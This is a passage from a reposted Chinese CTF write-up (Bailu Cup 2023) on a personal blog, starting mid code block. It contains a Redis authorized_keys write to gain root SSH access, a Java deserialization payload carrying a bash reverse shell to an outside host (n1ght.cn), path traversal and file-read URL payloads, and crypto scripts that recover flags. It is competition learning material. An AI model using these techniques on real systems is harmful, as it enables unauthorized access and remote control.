class="line">sh.interactive()</span><br><span class="line">../../../../usr/local/share/application.properties</span><br><span class="line">ssh-keygen -t rsa #生成公私钥</span><br><span class="line">(echo -e &quot;nn&quot;;cat /root/.ssh/id_rsa.pub;</span><br><span class="line">echo -e &quot;nn&quot;)&gt;key.txt #写入</span><br><span class="line">cat /root/.ssh/key.txt | proxychains4 redis-cli -h 172.25.0.10 -p 62341  -a de17cb1cfa1a8e8011f027b416775c6a -x set xqq  </span><br><span class="line">proxychains redis-cli -h 172.25.0.10 -p 62341 -a de17cb1cfa1a8e8011f027b416775c6a</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br><span class="line">proxychains ssh -i id_rsa root@172.25.0.10</span><br><span class="line">package com.example.demo;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">public class Test &#123;    public static void main(String[] args) throws IOException &#123;        Ping ping = new Ping();        ping.setCommand(&quot;/bin/bash&quot;);        ping.setArg1(&quot;-c&quot;);        ping.setArg2(&quot;bash -i &gt;&amp; /dev/tcp/n1ght.cn/5555 0&gt;&amp;1&quot;);        ByteArrayOutputStream bao = new ByteArrayOutputStream();        new ObjectOutputStream(bao).writeObject(ping);        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));</span><br><span class="line">    &#125;&#125;</span><br><span class="line">?file[href]=aa&amp;file[origin]=aa&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=%2566lag.txt</span><br><span class="line">import base64</span><br><span class="line">enc_flag1 = &quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;O0O = &quot;6925cc02789c1d2552b71acc4a2d48fd&quot;</span><br><span class="line"></span><br><span class="line">def decrypt(encrypted, key):    # Step 1: Base64 decode the encrypted flag    decoded_bytes = base64.b64decode(encrypted)    decoded_str = decoded_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line">    decrypted = []</span><br><span class="line">    # Step 2: XOR decryption    for i in range(len(decoded_str)):        decrypted_char = chr(ord(decoded_str[i]) ^ ord(key[i % len(key)]))        decrypted.append(decrypted_char)</span><br><span class="line">    return &#x27;&#x27;.join(decrypted)</span><br><span class="line"></span><br><span class="line">print(decrypt(enc_flag1, O0O))</span><br><span class="line">num3=1.23389923415003373900567515471436168841941584796842188964423737295914869304653496800649965063081353720701415762591488370228399019899893688681309320356016722276295236528757306976510687729729934668311830828756908988350841843676900575414367123810470585198055372776278588638204471298838884740198056387082949710435502826460830711429956c = continued_fraction(num3)alist = c.convergents()for i in alist:    a = str(i).split(&#x27;/&#x27;)    if len(a)&gt;1 and gcd(int(a[0]),int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(a[0]).bit_length()==512 and int(a[1]).bit_length()==512:            print(a)   #[&#x27;11167377337790397338811417806698264734026040696284907854286100186126887838302430726803014418419121360514985339992064951270502853852777225947659429837569693&#x27;, &#x27;9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517&#x27;]</span><br><span class="line">d = inverse_mod(num1, (num1-1)*(num2-1))p_q = pow(leak,d, num1*num2) #p_q = 1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152</span><br><span class="line">p_q=1031221249585875604184791796950952251782528195052531920165093585422640167920112408176595846917625510470783087032532545254805420044855275871408444733261152n=61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673</span><br><span class="line">e = 65537c = 31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393</span><br><span class="line">var(&quot;p,q&quot;)eq1= p-q ==p_qeq2= p*q ==nsol = solve([eq1,eq2], p, q)print(sol)#[p == 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719, q == 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567</span><br><span class="line">from Crypto.Util.number import *import gmpy2p = 8397652354751369475047895816963473478350245201262315191356674989898449420511844471318815750077346111978800531467822072132495108840045942922000560423170719q = 7366431105165493870863104020012521226567717006209783271191581404475809252591732063142219903159720601508017444435289526877689688795190667050592115689909567c=31011170589632318837149853165664224847925206003567781692767655474759523146503572164952138829336342836023903919700264739071138739105931471740973631326608186969523753119546323993892359278563753903149741128282349467136720827132122619177620866305659196267641453819504766216964516467658995724859657544518337771393e=65537m=9050477566333038464101590216458863799039754468566791821195736389139213194857548339787600682491327798736538059818887575696704421576721592454156775006222517</span><br><span class="line">n=61860727516406742636690805639158184396057779906729165734489212939937929906456706343476469874085504076991779041906401043694401076841639925611957258119417559980829238154105119701407722069260962772947894516879731956778127512764229384957918619863998939985369399189275568362193066167855420897196095587732512368673d=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)flag=m-mprint(long_to_bytes(flag))#b&#x27;flag&#123;ISEC-WeMu5tKe2pOn_70in5And#N3Ver@G1veUp!&#125;&#x27;</span><br><span class="line">def _l(idx, s):    return s[idx:] + s[:</span><br><span class="line">idx]def mainProc(p, k1, k2):    s = b&quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;    t = [[_l((i+j)%len(s), s) for j in range(len(s))] for i in range(len(s))]    i1 = 0    i2 = 0    c = b&quot;&quot;    for a in p:        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]        i1 = (i1 + 1) % len(k1)        i2 = (i2 + 1) % len(k2)    return c</span><br><span class="line">def vigeneredecode(enc,key):    mod = len(table)    flag = &#x27;&#x27;    for i in range(len(enc)):        num1 = table.index(enc[i])        num2 = table.index(key[i % len(key)])        ans = (num1 - num2) % mod        flag += table[ans]    return flag</span><br><span class="line">def vigenereencode(enc,key):    mod = len(table)    flag = &#x27;&#x27;    for i in range(len(enc)):        num1 = table.index(enc[i])        num2 = table.index(key[i % len(key)])        ans = (num1 + num2) % mod        flag += table[ans]    return flag</span><br><span class="line">enc = &#x27;6JnsNxHKJ8mkvhS&#123;rMO_c9apMfHDHObq80PMu&#123;_ww_r&#123;rq&#x27;fleg = &#x27;flag&#123;ISEC-&#x27;table = &quot;abcd07efghij89klmnopqr16stuvwxyz-_&#123;&#125;ABCDEFGHIJKL34MNOPQRST25VWXYZ&quot;key = vigeneredecode(enc,fleg)[:10]print(key)key = key + key[::-1]flag = vigeneredecode(enc,key)print(flag)#flag&#123;ISEC-Afr1en7_1nN33d_1S_Afr9end_ind88d0o0&#125;</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/139080.html">https://www.ctfiot.com/139080.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023_WP_-Polaris%E6%88%98%E9%98%9F.full.md">CTF大赛WP集合&#x2F;articles&#x2F;柏鹭杯2023_WP_-Polaris战队.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN-eval-heap/">PWN eval/heap</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Pwn/%E5%8D%8E%E4%B8%BA%E6%9D%AF%E7%A0%94%E7%A9%B6%E7%94%9F%E5%9B%BD%E8%B5%9B_adv_lua/" title="华为杯研究生国赛 adv_lua"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">华为杯研究生国赛 adv_lua</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/Pwn/%E6%98%A5%E7%A7%8B%E6%9D%AFWP-2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B%E4%B9%8Bpwn-web-misc%E7%AF%87/" title="春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春秋杯WP｜2023春秋杯春季赛之pwn、web、misc篇</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#coding"><span class="toc-number">1.</span> <span class="toc-text">-*- coding:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding-1"><span class="toc-number">2.</span> <span class="toc-text">-*- coding:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">2.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
